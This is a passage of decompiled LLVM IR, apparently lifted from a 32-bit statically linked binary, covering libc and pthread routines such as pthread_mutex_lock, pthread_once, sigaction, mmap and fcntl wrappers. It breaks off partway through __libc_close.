  %v3_805a2f5 = call i32 @__pthread_trylock(i32 %v0_805a2f5, i32 %v0_805a2ad, i32 %v0_805a2ac)
  %v1_805a2fa = icmp eq i32 %v3_805a2f5, 0
  store i32 %v3_805a2f5, i32* @esi, align 4
  %v1_805a2fe = icmp eq i1 %v1_805a2fa, false
  br i1 %v1_805a2fe, label %dec_label_pc_805a32f, label %dec_label_pc_805a300

dec_label_pc_805a300:                             ; preds = %dec_label_pc_805a2f2
  %v0_805a300 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a300 = load i32, i32* @ebx, align 4
  %v2_805a300 = add i32 %v1_805a300, 8
  %v3_805a300 = inttoptr i32 %v2_805a300 to i32*
  store i32 %v0_805a300, i32* %v3_805a300, align 4
  %v0_805a303 = load i32, i32* @ebx, align 4
  %v1_805a303 = add i32 %v0_805a303, 4
  %v2_805a303 = inttoptr i32 %v1_805a303 to i32*
  store i32 0, i32* %v2_805a303, align 4
  br label %dec_label_pc_805a32f

dec_label_pc_805a30c:                             ; preds = %dec_label_pc_805a2c3
  %v1_805a30c = add i32 %arg1, 16
  store i32 %v1_805a30c, i32* @eax, align 4
  %v3_805a30f = call i32 @__pthread_alt_trylock(i32 %v0_805a2ae, i32 %v0_805a2ad, i32 %v0_805a2ac)
  %v1_805a314 = icmp eq i32 %v3_805a30f, 0
  store i32 %v3_805a30f, i32* @esi, align 4
  %v1_805a318 = icmp eq i1 %v1_805a314, false
  br i1 %v1_805a318, label %dec_label_pc_805a32f, label %dec_label_pc_805a31a

dec_label_pc_805a31a:                             ; preds = %dec_label_pc_805a30c
  %v0_805a31a = load i32, i32* %stack_var_-12, align 4
  %v1_805a31a = call i32 @thread_self.19(i32 %v0_805a31a)
  %v1_805a31f = load i32, i32* @ebx, align 4
  %v2_805a31f = add i32 %v1_805a31f, 8
  %v3_805a31f = inttoptr i32 %v2_805a31f to i32*
  store i32 %v1_805a31a, i32* %v3_805a31f, align 4
  br label %dec_label_pc_805a32f

dec_label_pc_805a324:                             ; preds = %dec_label_pc_805a2c8
  %v1_805a324 = add i32 %arg1, 16
  store i32 %v1_805a324, i32* @eax, align 4
  store i32 %v0_805a2ae, i32* @ebx, align 4
  %v3_805a32a = call i32 @__pthread_alt_trylock(i32 %v0_805a2ae, i32 %v0_805a2ad, i32 %v0_805a2ac)
  br label %dec_label_pc_805a32f

dec_label_pc_805a32f:                             ; preds = %dec_label_pc_805a30c, %dec_label_pc_805a2f2, %dec_label_pc_805a31a, %dec_label_pc_805a300, %dec_label_pc_805a2eb, %dec_label_pc_805a2cd, %dec_label_pc_805a324
  %v2_805a32f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a32f, i32* @ebx, align 4
  %v0_805a330 = load i32, i32* @esi, align 4
  store i32 %v0_805a2ad, i32* @esi, align 4
  store i32 %v0_805a2ac, i32* @edi, align 4
  ret i32 %v0_805a330

; uselistorder directives
  uselistorder i32 %v1_805a2df, { 1, 0 }
  uselistorder i32 %v1_805a2b6, { 1, 0 }
  uselistorder i32 %v3_805a2b3, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_805a2ae, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_805a2ad, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_805a2ac, { 0, 3, 2, 1, 4 }
  uselistorder i32* %stack_var_-12, { 3, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @__pthread_alt_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805a32f, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_805a2df, { 1, 0 }
  uselistorder label %dec_label_pc_805a2cd, { 1, 0 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805a3f4 = load i32, i32* @esi, align 4
  %v0_805a3f5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805a3fd = add i32 %arg1, 12
  %v2_805a3fd = inttoptr i32 %v1_805a3fd to i32*
  %v3_805a3fd = load i32, i32* %v2_805a3fd, align 4
  %v1_805a400 = add i32 %v3_805a3fd, -1
  %v5_805a400 = icmp eq i32 %v3_805a3fd, 0
  %v9_805a400 = icmp eq i32 %v1_805a400, 0
  br i1 %v9_805a400, label %dec_label_pc_805a42a, label %dec_label_pc_805a405

dec_label_pc_805a405:                             ; preds = %entry
  %v10_805a400 = icmp slt i32 %v1_805a400, 0
  %v6_805a400 = sub i32 0, %v3_805a3fd
  %v7_805a400 = and i32 %v3_805a3fd, %v6_805a400
  %v8_805a400 = icmp slt i32 %v7_805a400, 0
  %v3_805a405 = icmp eq i1 %v10_805a400, %v8_805a400
  br i1 %v3_805a405, label %dec_label_pc_805a40d, label %dec_label_pc_805a407

dec_label_pc_805a407:                             ; preds = %dec_label_pc_805a405
  br i1 %v5_805a400, label %dec_label_pc_805a41e, label %dec_label_pc_805a417

dec_label_pc_805a40d:                             ; preds = %dec_label_pc_805a405
  %v9_805a40d = icmp eq i32 %v3_805a3fd, 2
  br i1 %v9_805a40d, label %dec_label_pc_805a453, label %dec_label_pc_805a412

dec_label_pc_805a412:                             ; preds = %dec_label_pc_805a40d
  %v9_805a412 = icmp eq i32 %v3_805a3fd, 3
  br i1 %v9_805a412, label %dec_label_pc_805a475, label %dec_label_pc_805a417

dec_label_pc_805a417:                             ; preds = %dec_label_pc_805a407, %dec_label_pc_805a412
  br label %dec_label_pc_805a487

dec_label_pc_805a41e:                             ; preds = %dec_label_pc_805a407
  %v1_805a41e = add i32 %arg1, 16
  store i32 %v1_805a41e, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_805a423 = call i32 @__pthread_lock(i32 %v0_805a3f5)
  br label %dec_label_pc_805a439

dec_label_pc_805a42a:                             ; preds = %entry
  %v1_805a42a = call i32 @thread_self.19(i32 %v0_805a3f5)
  %v0_805a42f = load i32, i32* @esi, align 4
  %v1_805a42f = add i32 %v0_805a42f, 8
  %v2_805a42f = inttoptr i32 %v1_805a42f to i32*
  %v3_805a42f = load i32, i32* %v2_805a42f, align 4
  %v15_805a42f = icmp eq i32 %v3_805a42f, %v1_805a42a
  store i32 %v1_805a42a, i32* @ebx, align 4
  %v1_805a434 = icmp eq i1 %v15_805a42f, false
  br i1 %v1_805a434, label %dec_label_pc_805a43d, label %dec_label_pc_805a436

dec_label_pc_805a436:                             ; preds = %dec_label_pc_805a42a
  %v1_805a436 = add i32 %v0_805a42f, 4
  %v2_805a436 = inttoptr i32 %v1_805a436 to i32*
  %v3_805a436 = load i32, i32* %v2_805a436, align 4
  %v4_805a436 = add i32 %v3_805a436, 1
  store i32 %v4_805a436, i32* %v2_805a436, align 4
  br label %dec_label_pc_805a439

dec_label_pc_805a439:                             ; preds = %dec_label_pc_805a43d, %dec_label_pc_805a41e, %dec_label_pc_805a436
  br label %dec_label_pc_805a487

dec_label_pc_805a43d:                             ; preds = %dec_label_pc_805a42a
  %v1_805a43d = add i32 %v0_805a42f, 16
  store i32 %v1_805a43d, i32* @eax, align 4
  store i32 %v1_805a42a, i32* @edx, align 4
  %v1_805a442 = call i32 @__pthread_lock(i32 %v0_805a3f5)
  %v0_805a447 = load i32, i32* @ebx, align 4
  %v1_805a447 = load i32, i32* @esi, align 4
  %v2_805a447 = add i32 %v1_805a447, 8
  %v3_805a447 = inttoptr i32 %v2_805a447 to i32*
  store i32 %v0_805a447, i32* %v3_805a447, align 4
  %v0_805a44a = load i32, i32* @esi, align 4
  %v1_805a44a = add i32 %v0_805a44a, 4
  %v2_805a44a = inttoptr i32 %v1_805a44a to i32*
  store i32 0, i32* %v2_805a44a, align 4
  br label %dec_label_pc_805a439

dec_label_pc_805a453:                             ; preds = %dec_label_pc_805a40d
  %v1_805a453 = call i32 @thread_self.19(i32 %v0_805a3f5)
  store i32 %v1_805a453, i32* @ebx, align 4
  %v0_805a45f = load i32, i32* @esi, align 4
  %v1_805a45f = add i32 %v0_805a45f, 8
  %v2_805a45f = inttoptr i32 %v1_805a45f to i32*
  %v3_805a45f = load i32, i32* %v2_805a45f, align 4
  %v15_805a45f = icmp eq i32 %v3_805a45f, %v1_805a453
  br i1 %v15_805a45f, label %dec_label_pc_805a487, label %dec_label_pc_805a464

dec_label_pc_805a464:                             ; preds = %dec_label_pc_805a453
  %v1_805a467 = add i32 %v0_805a45f, 16
  %v3_805a46b = inttoptr i32 %v1_805a467 to i32*
  %v4_805a46b = call i32 @__pthread_alt_lock(i32* %v3_805a46b, i32 %v1_805a453, i32 35)
  %v0_805a470 = load i32, i32* @ebx, align 4
  %v1_805a470 = load i32, i32* @esi, align 4
  %v2_805a470 = add i32 %v1_805a470, 8
  %v3_805a470 = inttoptr i32 %v2_805a470 to i32*
  store i32 %v0_805a470, i32* %v3_805a470, align 4
  br label %dec_label_pc_805a482

dec_label_pc_805a475:                             ; preds = %dec_label_pc_805a412
  %v0_805a475 = load i32, i32* @ecx, align 4
  %v1_805a479 = add i32 %arg1, 16
  %v3_805a47d = inttoptr i32 %v1_805a479 to i32*
  %v4_805a47d = call i32 @__pthread_alt_lock(i32* %v3_805a47d, i32 0, i32 %v0_805a475)
  br label %dec_label_pc_805a482

dec_label_pc_805a482:                             ; preds = %dec_label_pc_805a464, %dec_label_pc_805a475
  br label %dec_label_pc_805a487

dec_label_pc_805a487:                             ; preds = %dec_label_pc_805a453, %dec_label_pc_805a439, %dec_label_pc_805a417, %dec_label_pc_805a482
  %v0_805a48a = phi i32 [ 35, %dec_label_pc_805a453 ], [ 0, %dec_label_pc_805a439 ], [ 22, %dec_label_pc_805a417 ], [ 0, %dec_label_pc_805a482 ]
  %v2_805a487 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a487, i32* @edx, align 4
  store i32 %v0_805a3f5, i32* @ebx, align 4
  store i32 %v0_805a3f4, i32* @esi, align 4
  ret i32 %v0_805a48a

; uselistorder directives
  uselistorder i32 %v1_805a453, { 1, 0, 2 }
  uselistorder i32 %v1_805a42a, { 1, 2, 0 }
  uselistorder i32 %v1_805a400, { 1, 0 }
  uselistorder i32 %v3_805a3fd, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_805a3f5, { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32)* @thread_self.19, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32 (i32)* @__pthread_lock, { 1, 0, 6, 7, 5, 3, 4, 2 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805a487, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805a482, { 1, 0 }
  uselistorder label %dec_label_pc_805a439, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805a417, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare() local_unnamed_addr {
entry:
  %v1_805a493 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807b63c.675 to i32))
  ret i32 %v1_805a493
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v0_805a49c = load i32, i32* @esi, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v2_805a4a5 = load i32, i32* %arg1, align 4
  %v11_805a4a5 = icmp eq i32 %v2_805a4a5, 2
  %v1_805a4a8 = icmp eq i1 %v11_805a4a5, false
  br i1 %v1_805a4a8, label %dec_label_pc_805a4af, label %dec_label_pc_805a576

dec_label_pc_805a4af:                             ; preds = %entry
  %v1_805a4b7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807b63c.675 to i32))
  %v0_805a4bc = load i32, i32* @esi, align 4
  %v1_805a4bc = inttoptr i32 %v0_805a4bc to i32*
  %v2_805a4bc = load i32, i32* %v1_805a4bc, align 4
  %v1_805a4c3 = urem i32 %v2_805a4bc, 4
  %v8_805a4c6 = icmp eq i32 %v1_805a4c3, 1
  %v1_805a4c7 = icmp eq i1 %v8_805a4c6, false
  br i1 %v1_805a4c7, label %dec_label_pc_805a4f0.preheader, label %dec_label_pc_805a4c9

dec_label_pc_805a4c9:                             ; preds = %dec_label_pc_805a4af
  %v1_805a4c9 = and i32 %v2_805a4bc, -4
  %v1_805a4cc = load i32, i32* @global_var_807b660.677, align 32
  %v12_805a4cc = icmp eq i32 %v1_805a4c9, %v1_805a4cc
  br i1 %v12_805a4cc, label %dec_label_pc_805a4f0.preheader, label %dec_label_pc_805a4d4

dec_label_pc_805a4d4:                             ; preds = %dec_label_pc_805a4c9
  store i32 0, i32* %v1_805a4bc, align 4
  %v0_805a4f013.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a4f0.preheader

dec_label_pc_805a4f0.preheader:                   ; preds = %dec_label_pc_805a4d4, %dec_label_pc_805a4af, %dec_label_pc_805a4c9
  %v0_805a4f013 = phi i32 [ %v0_805a4f013.pre, %dec_label_pc_805a4d4 ], [ %v0_805a4bc, %dec_label_pc_805a4af ], [ %v0_805a4bc, %dec_label_pc_805a4c9 ]
  %v1_805a4f014 = inttoptr i32 %v0_805a4f013 to i32*
  %v2_805a4f015 = load i32, i32* %v1_805a4f014, align 4
  %v1_805a4f416 = urem i32 %v2_805a4f015, 4
  %v8_805a4f719 = icmp eq i32 %v1_805a4f416, 1
  br i1 %v8_805a4f719, label %dec_label_pc_805a4dc, label %dec_label_pc_805a4fa

dec_label_pc_805a4dc:                             ; preds = %dec_label_pc_805a4f0.preheader, %dec_label_pc_805a4dc
  %v0_805a4dc = load i32, i32* @ecx, align 4
  %v4_805a4e8 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_807b654.676 to i32), i32 ptrtoint (i32* @global_var_807b63c.675 to i32), i32 %v0_805a4dc, i32 %v0_805a4dc)
  %v0_805a4f0 = load i32, i32* @esi, align 4
  %v1_805a4f0 = inttoptr i32 %v0_805a4f0 to i32*
  %v2_805a4f0 = load i32, i32* %v1_805a4f0, align 4
  %v1_805a4f4 = urem i32 %v2_805a4f0, 4
  %v8_805a4f7 = icmp eq i32 %v1_805a4f4, 1
  br i1 %v8_805a4f7, label %dec_label_pc_805a4dc, label %dec_label_pc_805a4fa

dec_label_pc_805a4fa:                             ; preds = %dec_label_pc_805a4dc, %dec_label_pc_805a4f0.preheader
  %v1_805a4f0.lcssa = phi i32* [ %v1_805a4f014, %dec_label_pc_805a4f0.preheader ], [ %v1_805a4f0, %dec_label_pc_805a4dc ]
  %v2_805a4f0.lcssa = phi i32 [ %v2_805a4f015, %dec_label_pc_805a4f0.preheader ], [ %v2_805a4f0, %dec_label_pc_805a4dc ]
  store i32 0, i32* @ebx, align 4
  %v1_805a4fc = icmp eq i32 %v2_805a4f0.lcssa, 0
  %v1_805a4fe = icmp eq i1 %v1_805a4fc, false
  br i1 %v1_805a4fe, label %dec_label_pc_805a552, label %dec_label_pc_805a500

dec_label_pc_805a500:                             ; preds = %dec_label_pc_805a4fa
  %v0_805a500 = load i32, i32* @global_var_807b660.677, align 32
  %v1_805a508 = or i32 %v0_805a500, 1
  store i32 %v1_805a508, i32* %v1_805a4f0.lcssa, align 4
  %v1_805a512 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807b63c.675 to i32))
  %v0_805a51a = load i32, i32* @esi, align 4
  %v2_805a520 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805a520, i32* @ebx, align 4
  %v4_805a525 = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-24, i32 134587774, i32 %v0_805a51a)
  call void @__pseudo_call(i32 %tmp2)
  %v3_805a533 = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-24, i32 0)
  %v1_805a53f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807b63c.675 to i32))
  store i32 1, i32* @ebx, align 4
  %v0_805a54c = load i32, i32* @esi, align 4
  %v1_805a54c = inttoptr i32 %v0_805a54c to i32*
  store i32 2, i32* %v1_805a54c, align 4
  br label %dec_label_pc_805a552

dec_label_pc_805a552:                             ; preds = %dec_label_pc_805a4fa, %dec_label_pc_805a500
  %v1_805a55a = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807b63c.675 to i32))
  %v0_805a562 = load i32, i32* @ebx, align 4
  %v1_805a562 = icmp eq i32 %v0_805a562, 0
  br i1 %v1_805a562, label %dec_label_pc_805a576, label %dec_label_pc_805a566

dec_label_pc_805a566:                             ; preds = %dec_label_pc_805a552
  %v1_805a56e = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_807b654.676 to i32))
  br label %dec_label_pc_805a576

dec_label_pc_805a576:                             ; preds = %entry, %dec_label_pc_805a552, %dec_label_pc_805a566
  store i32 %v0_805a49c, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805a4f0, { 1, 0 }
  uselistorder i32 %v2_805a4f015, { 1, 0 }
  uselistorder i32 %v2_805a4bc, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder i32* @global_var_807b654.676, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_807b654.676 to i32), { 1, 0 }
  uselistorder i32* @global_var_807b660.677, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_807b63c.675 to i32), { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_805a576, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805a552, { 1, 0 }
  uselistorder label %dec_label_pc_805a4dc, { 1, 0 }
  uselistorder label %dec_label_pc_805a4f0.preheader, { 0, 2, 1 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805a68c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805a6a1 = icmp eq i32* %arg2, null
  br i1 %v1_805a6a1, label %dec_label_pc_805a6f5, label %dec_label_pc_805a6a5

dec_label_pc_805a6a5:                             ; preds = %entry
  %v2_805a6a5 = load i32, i32* %arg2, align 4
  store i32 %v2_805a6a5, i32* %stack_var_-148, align 4
  %v1_805a6ae = add i32 %tmp11, 4
  %v3_805a6c0 = bitcast i32* %stack_var_-136 to i16*
  %v4_805a6c0 = call i32 @memcpy(i16* %v3_805a6c0, i32 %v1_805a6ae, i32 128)
  br label %dec_label_pc_805a6f5

dec_label_pc_805a6f5:                             ; preds = %entry, %dec_label_pc_805a6a5
  %v1_805a6f7 = icmp eq i32 %arg3, 0
  br i1 %v1_805a6f7, label %dec_label_pc_805a6ff, label %dec_label_pc_805a6fb

dec_label_pc_805a6fb:                             ; preds = %dec_label_pc_805a6f5
  %v2_805a6fb = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_805a6ff

dec_label_pc_805a6ff:                             ; preds = %dec_label_pc_805a6f5, %dec_label_pc_805a6fb
  %v0_805a70e = phi i32 [ 0, %dec_label_pc_805a6f5 ], [ %v2_805a6fb, %dec_label_pc_805a6fb ]
  br i1 %v1_805a6a1, label %dec_label_pc_805a70c, label %dec_label_pc_805a705

dec_label_pc_805a705:                             ; preds = %dec_label_pc_805a6ff
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805a70c

dec_label_pc_805a70c:                             ; preds = %dec_label_pc_805a6ff, %dec_label_pc_805a705
  %v0_805a70f = phi %sigaction* [ null, %dec_label_pc_805a6ff ], [ %phitmp, %dec_label_pc_805a705 ]
  %v5_805a717 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_805a70f, i32 %v0_805a70e, i32 8)
  store i32 %v5_805a717, i32* %ebx.global-to-local, align 4
  br i1 %v1_805a6f7, label %dec_label_pc_805a75a, label %dec_label_pc_805a725

dec_label_pc_805a725:                             ; preds = %dec_label_pc_805a70c
  %v2_805a725 = icmp slt i32 %v5_805a717, 0
  br i1 %v2_805a725, label %dec_label_pc_805a75a, label %dec_label_pc_805a729

dec_label_pc_805a729:                             ; preds = %dec_label_pc_805a725
  %v3_805a729 = load i32, i32* %stack_var_-288, align 4
  %v2_805a72d = inttoptr i32 %arg3 to i32*
  store i32 %v3_805a729, i32* %v2_805a72d, align 4
  %v2_805a735 = ptrtoint i32* %stack_var_-276 to i32
  %v1_805a73a = add i32 %arg3, 4
  %v3_805a73e = inttoptr i32 %v1_805a73a to i16*
  %v4_805a73e = call i32 @memcpy(i16* %v3_805a73e, i32 %v2_805a735, i32 128)
  %v2_805a747 = add i32 %arg3, 132
  %v3_805a747 = inttoptr i32 %v2_805a747 to i32*
  %v2_805a754 = add i32 %arg3, 136
  %v3_805a754 = inttoptr i32 %v2_805a754 to i32*
  %v0_805a760.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a75a

dec_label_pc_805a75a:                             ; preds = %dec_label_pc_805a725, %dec_label_pc_805a70c, %dec_label_pc_805a729
  %v0_805a760 = phi i32 [ %v5_805a717, %dec_label_pc_805a725 ], [ %v5_805a717, %dec_label_pc_805a70c ], [ %v0_805a760.pre, %dec_label_pc_805a729 ]
  store i32 %v0_805a68c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805a760

; uselistorder directives
  uselistorder i32 %v5_805a717, { 0, 1, 3, 2 }
  uselistorder i1 %v1_805a6f7, { 1, 0 }
  uselistorder i1 %v1_805a6a1, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_805a75a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a70c, { 1, 0 }
  uselistorder label %dec_label_pc_805a6ff, { 1, 0 }
  uselistorder label %dec_label_pc_805a6f5, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_805a7f8 = load i32, i32* @ebx, align 4
  %v2_805a7ff = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805a7ff, i32* @ebx, align 4
  %v8_805a803 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805a7f8, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_805a803, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134618888)
  ret i32 %v8_805a803

; uselistorder directives
  uselistorder i32 %v8_805a803, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805a814 = load i32, i32* @edi, align 4
  %v0_805a815 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805a82d = add i32 %arg2, -12
  %v6_805a833 = icmp ugt i32 %v1_805a82d, 2
  br i1 %v6_805a833, label %dec_label_pc_805a843, label %dec_label_pc_805a835

dec_label_pc_805a835:                             ; preds = %entry
  %v4_805a839 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_805a82d)
  br label %dec_label_pc_805a865

dec_label_pc_805a843:                             ; preds = %entry
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a84b = call i32 @fcntl(i32 %v0_805a815)
  store i32 %v1_805a84b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a84b, -4095
  br i1 %tmp, label %dec_label_pc_805a863, label %dec_label_pc_805a857

dec_label_pc_805a857:                             ; preds = %dec_label_pc_805a843
  %v1_805a857 = call i32 @__errno_location(i32 %v0_805a815)
  %v0_805a85c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a85c = sub i32 0, %v0_805a85c
  %v2_805a85e = inttoptr i32 %v1_805a857 to i32*
  store i32 %v1_805a85c, i32* %v2_805a85e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a863

dec_label_pc_805a863:                             ; preds = %dec_label_pc_805a843, %dec_label_pc_805a857
  %v0_805a863 = phi i32 [ %v1_805a84b, %dec_label_pc_805a843 ], [ -1, %dec_label_pc_805a857 ]
  br label %dec_label_pc_805a865

dec_label_pc_805a865:                             ; preds = %dec_label_pc_805a835, %dec_label_pc_805a863
  %v0_805a86a = phi i32 [ %v4_805a839, %dec_label_pc_805a835 ], [ %v0_805a863, %dec_label_pc_805a863 ]
  store i32 %v0_805a815, i32* @ebx, align 4
  store i32 %v0_805a814, i32* @edi, align 4
  ret i32 %v0_805a86a

; uselistorder directives
  uselistorder i32 %v1_805a84b, { 1, 0, 2 }
  uselistorder i32 %v0_805a815, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a865, { 1, 0 }
  uselistorder label %dec_label_pc_805a863, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a86c = load i32, i32* @edi, align 4
  store i32 %v0_805a86c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805a884 = load i32, i32* @ebx, align 4
  %v1_805a88c = call i32 @int80_syscall(i32 221)
  store i32 %v1_805a88c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a88c, -4095
  br i1 %tmp, label %dec_label_pc_805a8a4, label %dec_label_pc_805a898

dec_label_pc_805a898:                             ; preds = %entry
  %v1_805a898 = call i32 @__errno_location(i32 %v0_805a884)
  %v0_805a89d = load i32, i32* %edi.global-to-local, align 4
  %v1_805a89d = sub i32 0, %v0_805a89d
  %v2_805a89f = inttoptr i32 %v1_805a898 to i32*
  store i32 %v1_805a89d, i32* %v2_805a89f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a8a4

dec_label_pc_805a8a4:                             ; preds = %entry, %dec_label_pc_805a898
  %v0_805a8a7 = phi i32 [ %v1_805a88c, %entry ], [ -1, %dec_label_pc_805a898 ]
  %v2_805a8a9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a8a9, i32* %edi.global-to-local, align 4
  ret i32 %v0_805a8a7

; uselistorder directives
  uselistorder i32 %v1_805a88c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a8a4, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_805a8ad = load i32, i32* @esi, align 4
  store i32 %v0_805a8ad, i32* %stack_var_-8, align 4
  %v4_805a8b5 = ptrtoint %sigaction* %arg2 to i32
  store i32 %v4_805a8b5, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805a8c1 = load i32, i32* @ebx, align 4
  %v7_805a8c9 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805a8c9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_805a8c9, -4095
  br i1 %tmp, label %dec_label_pc_805a8e1, label %dec_label_pc_805a8d5

dec_label_pc_805a8d5:                             ; preds = %entry
  %v1_805a8d5 = call i32 @__errno_location(i32 %v0_805a8c1)
  %v0_805a8da = load i32, i32* %esi.global-to-local, align 4
  %v1_805a8da = sub i32 0, %v0_805a8da
  %v2_805a8dc = inttoptr i32 %v1_805a8d5 to i32*
  store i32 %v1_805a8da, i32* %v2_805a8dc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805a8e1

dec_label_pc_805a8e1:                             ; preds = %entry, %dec_label_pc_805a8d5
  %v0_805a8e2 = phi i32 [ %v7_805a8c9, %entry ], [ -1, %dec_label_pc_805a8d5 ]
  %v2_805a8e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a8e4, i32* @esi, align 4
  ret i32 %v0_805a8e2

; uselistorder directives
  uselistorder i32 %v7_805a8c9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a8e1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a910 = load i32, i32* @edi, align 4
  store i32 %v0_805a910, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a918 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a920 = call i32 @close(i32 %v0_805a918)
  store i32 %v0_805a918, i32* @ebx, align 4
